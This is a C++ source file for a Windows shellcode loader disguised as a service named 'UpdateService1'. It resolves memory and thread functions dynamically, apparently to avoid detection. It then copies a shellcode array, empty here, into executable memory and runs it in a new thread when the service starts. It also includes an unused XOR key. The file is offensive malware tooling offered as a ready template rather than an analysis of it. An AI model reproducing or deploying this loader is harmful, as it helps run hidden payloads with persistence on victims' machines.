/*
    Release, x86
    ref: https://github.com/screeck/YouTube/blob/main/WindowsServices/main.c
*/
#include <windows.h>
#include <iostream>
#include <libloaderapi.h>

/* ======================== = shellcode ========================== */
unsigned char shellcode[] = "";



/* ======================== = shellcode ========================== */

unsigned char key[] = "\xAA";

typedef PVOID(WINAPI* pVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI* pCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef PVOID(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);
typedef PVOID(WINAPI* pRtlMoveMemory)(void*, void*, SIZE_T);


BOOL call()
{
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    pVirtualAlloc funcVirtualAlloc = (pVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
    pCreateThread funcCreateThread = (pCreateThread)GetProcAddress(hKernel32, "CreateThread");
    pWaitForSingleObject funcWaitForSingleObject = (pWaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");

    HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
    pRtlMoveMemory funcRtlMoveMemory = (pRtlMoveMemory)GetProcAddress(hNtdll, "RtlMoveMemory");

    LPVOID addressPointer = funcVirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (addressPointer == NULL)
    {
        std::cerr << "VirtualAlloc failed." << std::endl;
        return FALSE;
    }

    funcRtlMoveMemory(addressPointer, shellcode, sizeof(shellcode));
    HANDLE hThread = funcCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, NULL);
    funcWaitForSingleObject(hThread, INFINITE);
    return TRUE;
}

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

int main()
{
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = (LPWSTR)"UpdateService1";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcher(ServiceTable);


    return EXIT_SUCCESS;
}

void ServiceMain(int argc, char** argv) {

    hStatus = RegisterServiceCtrlHandler((LPWSTR)"UpdateService1", (LPHANDLER_FUNCTION)ControlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)0) {
        return;
    }


    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    SetServiceStatus(hStatus, &ServiceStatus);

    /* call main service function */
    call();

}

void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;

    default:
        break;
    }

    SetServiceStatus(hStatus, &ServiceStatus);
}